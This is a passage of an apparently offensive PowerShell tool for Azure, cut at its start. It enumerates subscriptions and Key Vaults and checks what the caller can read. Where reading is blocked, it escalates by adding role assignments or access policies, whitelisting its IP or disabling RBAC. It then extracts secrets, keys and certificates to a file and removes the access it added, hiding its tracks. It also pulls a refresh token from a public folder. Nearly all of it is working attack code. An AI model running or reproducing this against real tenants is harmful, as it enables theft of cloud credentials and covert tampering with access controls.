        Write-Host "[-] No subscriptions." -ForegroundColor Red; return
    }

    $subs = @($subResp.value | ForEach-Object {
        [PSCustomObject]@{ DisplayName = $_.displayName; SubscriptionId = $_.subscriptionId; State = $_.state }
    })

    Write-Host "[+] Found $($subs.Count) subscription(s)" -ForegroundColor Green

    foreach ($s in $subs) {
        Write-Host "    - $($s.DisplayName) ($($s.SubscriptionId)) [$($s.State)]" -ForegroundColor Gray
    }

    $totalExtracted = 0

    foreach ($sub in $subs) {
        if ($sub.State -ne "Enabled") { continue }

        Write-Host "`n  [*] Checking sub: $($sub.DisplayName)..." -ForegroundColor Cyan -NoNewline
        $subPerm = Get-SubscriptionPermSummary -SubscriptionId $sub.SubscriptionId -Headers $headers
        Write-Host " $subPerm" -ForegroundColor $(if ($subPerm -match "Owner|Contributor") { "Yellow" } else { "Gray" })

        
        Write-Host "  Subscription: $($sub.DisplayName) [$($sub.SubscriptionId)]" -ForegroundColor White
       

  
        $kvUri = "https://management.azure.com/subscriptions/$($sub.SubscriptionId)/resources?`$filter=resourceType eq 'Microsoft.KeyVault/vaults'`&api-version=2021-04-01"
        $kvList = Invoke-SmartRequest -Uri $kvUri -Headers $headers
        if (-not $kvList -or -not $kvList.value) {
            Write-Host "  [!] No Key Vaults found" -ForegroundColor DarkGray
            continue
        }

        foreach ($kv in $kvList.value) {
            $vaultName = $kv.name
            $vaultId = $kv.id
            $rg = if ($vaultId -match '/resourceGroups/([^/]+)/') { $Matches[1] } else { "Unknown" }

            Write-Host "`n  [..] Checking: $vaultName [RG: $rg]" -ForegroundColor Yellow

            # Get vault detail
            $kvDetail = Invoke-SmartRequest -Uri "https://management.azure.com$vaultId`?api-version=2022-07-01" -Headers $headers
            if (-not $kvDetail -or -not $kvDetail.properties) {
                Write-Host "    [!] No properties - skipping" -ForegroundColor DarkGray
                continue
            }

            $isRbac = [bool]$kvDetail.properties.enableRbacAuthorization
            $mode   = if ($isRbac) { "RBAC" } else { "AccessPolicy" }
            Write-Host "    [!] Mode: $mode" -ForegroundColor Cyan

            $permCheck = Test-VaultPermissions -VaultId $vaultId -Mode $mode -VaultDetail $kvDetail -MyOid $global:MyOid -Headers $headers
            $canRead   = $permCheck.CanReadSecrets -or $permCheck.CanReadKeys -or $permCheck.CanReadCerts

            if ($canRead) {
                $readList = @()
                if ($permCheck.CanReadSecrets) {
                     $readList += "Secrets" 
                }
                if ($permCheck.CanReadKeys) { 
                    $readList += "Keys" 
                    }
                if ($permCheck.CanReadCerts) { 
                    $readList += "Certs" 
                }

                Write-Host "    [+] Can read: $($readList -join ', ')" -ForegroundColor Green

                if ($global:VaultToken) {
                    $count = Extract-VaultData -VaultName $vaultName -SubscriptionId $sub.SubscriptionId -ResourceGroup $rg -DataPath $dataPath
                    if ($count -gt 0) {
                        $totalExtracted += $count
                        continue
                    }
                    if ($count -eq -1) {
                       
                        Write-Host "    [!] Firewall blocking. Trying escalation..." -ForegroundColor Gray
                    }
                    elseif ($count -eq 0) {
                        Write-Host "    [!] No items extracted (empty vault or access issue)" -ForegroundColor Gray
                        continue
                    }
                }
            }

            else {
                Write-Host "    [*] No direct data access" -ForegroundColor Gray
            }


            if (-not $permCheck.CanEscalate) {
                Write-Host "    [-] No escalation path. Contributor on RBAC vault without dataActions = dead end." -ForegroundColor Red
                continue
            }

            Write-Host "    [!] Escalating via $($permCheck.EscalateMethod)..." -ForegroundColor Yellow

            $changes = Add-VaultAccess -VaultName $vaultName -ResourceGroup $rg -VaultId $vaultId -SubscriptionId $sub.SubscriptionId -EscalateMethod $permCheck.EscalateMethod -MyOid $global:MyOid -MyIP $myIP


            $anyChange = $changes.RoleAdded -or $changes.APAdded -or $changes.IPAdded -or $changes.RBACDisabled

            if ($anyChange) {
                # RBAC role assignments need propagation time
                if ($changes.RoleAdded) {
                    Write-Host "    [*] Waiting for RBAC propagation (role assignment)..." -ForegroundColor DarkGray
                    $maxAttempts = 6
                    $extracted = $false

                    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
                        $waitSec = 30 * $attempt
                        Write-Host "    [*] Attempt $attempt/$maxAttempts - waiting $waitSec sec..." -ForegroundColor DarkGray
                        Start-Sleep -Seconds $waitSec

                        # Refresh vault token to pick up new dataActions
                        if ($global:AuthMethod -eq "ClientCredentials") {
                            $global:VaultToken = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -ClientID $global:CID -ClientSecret $global:CSecret -TenantID $global:TenantID
                        }
                        elseif ($global:AuthMethod -eq "RefreshToken") {
                            $rt = if (Test-Path "C:\Users\Public\RefreshToken.txt") { Get-Content "C:\Users\Public\RefreshToken.txt" } else { $global:RefreshTkn }
                            $global:VaultToken = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -RefreshToken $rt -TenantID $global:TenantID
                        }

                        $count = Extract-VaultData -VaultName $vaultName -SubscriptionId $sub.SubscriptionId -ResourceGroup $rg -DataPath $dataPath
                        if ($count -gt 0) {
                            $totalExtracted += $count
                            $extracted = $true
                            break
                        }
                        elseif ($count -eq -1) {
                            Write-Host "    [!] Still blocked (firewall or propagation). Retrying..." -ForegroundColor Yellow
                        }
                        else {
                            Write-Host "    [!] No data yet. Role may still be propagating..." -ForegroundColor Yellow
                        }
                    }

                    if (-not $extracted) {
                        Write-Host "    [-] Could not extract after $maxAttempts attempts. RBAC propagation may need more time." -ForegroundColor Red
                    }
                }
                else {
                    # AP or IP only - fast propagation
                    Start-Sleep -Seconds 10
                    $count = Extract-VaultData -VaultName $vaultName -SubscriptionId $sub.SubscriptionId -ResourceGroup $rg -DataPath $dataPath
                    if ($count -gt 0) { $totalExtracted += $count }
                }
            }


            Remove-VaultAccess -VaultName $vaultName -ResourceGroup $rg -VaultId $vaultId -SubscriptionId $sub.SubscriptionId -MyOid $global:MyOid -MyIP $myIP -Changes $changes
        }
    }

    Write-host " "
    Write-host " "
    Write-host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "
    Write-Host "  Total items extracted: $totalExtracted" -ForegroundColor $(if ($totalExtracted -gt 0) { "Green" } else { "Yellow" })
    Write-Host "  Output file: $dataPath" -ForegroundColor White
   
}

main -ClientID $ClientID -ClientSecret $ClientSecret -IdentityARM $IdentityARM -IdentityVault $IdentityVault -TenantName $TenantName

}
